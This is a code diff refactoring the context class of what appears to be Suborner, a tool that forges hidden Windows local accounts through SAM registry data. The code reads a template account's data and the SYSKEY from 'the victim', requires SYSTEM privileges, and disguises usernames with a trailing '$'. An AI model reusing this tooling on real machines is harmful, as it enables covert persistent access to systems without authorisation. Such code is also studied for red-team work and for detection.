@@ -2,10 +2,8 @@
 using Suborner.Module.SAM;
 using Suborner.UI;
 using System;
-using System.Collections.Generic;
 using System.Linq;
 using System.Runtime.InteropServices;
-using System.Text;
 
 namespace Suborner.Core
 {
@@ -14,6 +12,11 @@ namespace Suborner.Core
     /// </summary>
     public sealed class SubornerContext
     {
+        // Singleton session object for unique data
+        private static readonly Lazy<SubornerContext> lazy =
+        new Lazy<SubornerContext>(() => new SubornerContext());
+        public static SubornerContext Instance { get { return lazy.Value; } }
+
         public User User { get; set; }
         public int TemplateAccountRID { get; set; }
         public bool IsSystem { get; set; }
@@ -24,11 +27,11 @@ namespace Suborner.Core
         public byte[] SysKey { get; set; }
 
         // TODO: Refactor to SamAccount object
-        public string newNames { get; set; }
-        public byte[] newF { get; set; }       
-        public byte[] newV { get; set; }
+        public string NewNames { get; set; }
+        public byte[] NewF { get; set; }       
+        public byte[] NewV { get; set; }
 
-        // This is needed only for importing the Names Key
+        // This is needed only for Names Key importing
         // TODO: Make it totaly fileless! Or at least dynamic!
         public string cwd = String.Format("{0}\\Tasks\\", Environment.GetEnvironmentVariable("windir"));
 
@@ -53,20 +56,18 @@ namespace Suborner.Core
             }
             if (!IsSystem)
             {
-                Printer.PrintError("Error: You need SYSTEM privileges to suborn Windows :(");
+                Logger.PrintError("Error: You need SYSTEM privileges to suborn Windows :(");
                 System.Environment.Exit(1);
             }
         }
         /// <summary>
-        /// The <c>LoadSystemData</c> method loads the information needed from the victim
+        /// The <c>LoadSystemData</c> method loads from the victim the information needed for the process
         /// </summary>
         private void LoadSystemData() 
         {
             LocalAccountsRIDs = RegistryManager.GetUsersRIDs();
 
-            byte[] templateFValue;
-            byte[] templateVValue;
-            RegistryManager.GetUserData(TemplateAccountRID, out templateFValue, out templateVValue);
+            RegistryManager.GetUserData(TemplateAccountRID, out byte[] templateFValue, out byte[] templateVValue);
             TemplateF = templateFValue;
             TemplateV = templateVValue;
 
@@ -77,20 +78,20 @@ namespace Suborner.Core
             pDomAccF.Free();
 
             SysKey = RegistryManager.GetSysKey();
-            Printer.PrintDebug(String.Format("Retrieved SYSKEY: {0}", Utility.ByteArrayToString(SysKey)));
+            Logger.PrintDebug(String.Format("Retrieved SYSKEY: {0}", Utility.ByteArrayToString(SysKey)));
         }
         private void ValidateUsername() {
             // Didn't add special characters sanitization if you ever want to experiment with them :)
             if (User.Username.Equals("<HOSTNAME>$"))
             {
                 // TODO: Retrieve this from registry
-                Printer.PrintInfo("Retrieving hostname");
+                Logger.PrintInfo("Retrieving hostname");
                 User.Username = System.Environment.GetEnvironmentVariable("COMPUTERNAME") + "$";
                 return;
             }
             if (!User.Username.EndsWith("$"))
             {
-                Printer.PrintInfo("Appending $ to username");
+                Logger.PrintInfo("Appending $ to username");
                 User.Username += "$";
             }
         }
@@ -106,31 +107,31 @@ namespace Suborner.Core
                     else User.RID = LocalAccountsRIDs[LocalAccountsRIDs.Length-1] + 1;
                     break;
                 case 500:
-                    Printer.PrintError("Error: I shouldn't let you overwrite the 500 built-in account!");
+                    Logger.PrintError("Error: I shouldn't let you overwrite the 500 built-in account!");
                     System.Environment.Exit(1);
                     break;
                 case 501:
-                    Printer.PrintError("Error: I shouldn't let you overwrite the 501 built-in account!");
+                    Logger.PrintError("Error: I shouldn't let you overwrite the 501 built-in account!");
                     System.Environment.Exit(1);
                     break;
                 case 502:
-                    Printer.PrintError("Error: I shouldn't let you overwrite the 502 built-in account!");
+                    Logger.PrintError("Error: I shouldn't let you overwrite the 502 built-in account!");
                     System.Environment.Exit(1);
                     break;
                 case 503:
-                    Printer.PrintError("Error: I shouldn't let you overwrite the 503 built-in account!");
+                    Logger.PrintError("Error: I shouldn't let you overwrite the 503 built-in account!");
                     System.Environment.Exit(1);
                     break;
                 case 504:
-                    Printer.PrintError("Error: I shouldn't let you overwrite the 504 built-in account!");
+                    Logger.PrintError("Error: I shouldn't let you overwrite the 504 built-in account!");
                     System.Environment.Exit(1);
                     break;
                 case int r when r < 0:
-                    Printer.PrintError("Error: I shouldn't assign a negative RID to this account");
+                    Logger.PrintError("Error: I shouldn't assign a negative RID to this account");
                     System.Environment.Exit(1);
                     break;
                 case int r when r >= 65535:
-                    Printer.PrintError("Error: I shouldn't assign a RID >= 65535 to this account");
+                    Logger.PrintError("Error: I shouldn't assign a RID >= 65535 to this account");
                     System.Environment.Exit(1);
                     break;
 
@@ -142,28 +143,21 @@ namespace Suborner.Core
             switch (TemplateAccountRID)
             {
                 case int r when r < 0:
-                    Printer.PrintError("Error: I am sure there is no local account with a negative RID");
+                    Logger.PrintError("Error: I am sure there is no local account with a negative RID");
                     System.Environment.Exit(1);
                     break;
                 case int r when r >= 65535:
-                    Printer.PrintError("Error: I am sure there is no local account with RID >= 65535");
+                    Logger.PrintError("Error: I am sure there is no local account with RID >= 65535");
                     System.Environment.Exit(1);
                     break;
                 default:
                     if (!LocalAccountsRIDs.Contains(TemplateAccountRID)) 
                     {
-                        Printer.PrintError("Error: The account you want to use as a template does not exist");
+                        Logger.PrintError("Error: The account you want to use as a template does not exist");
                         System.Environment.Exit(1);
                     }
                     break;
             }
         }
-
-        // Singleton session object for unique data
-        private static readonly Lazy<SubornerContext> lazy =
-        new Lazy<SubornerContext>(() => new SubornerContext());
-
-        public static SubornerContext Instance { get { return lazy.Value; } }
-        
     }
 }
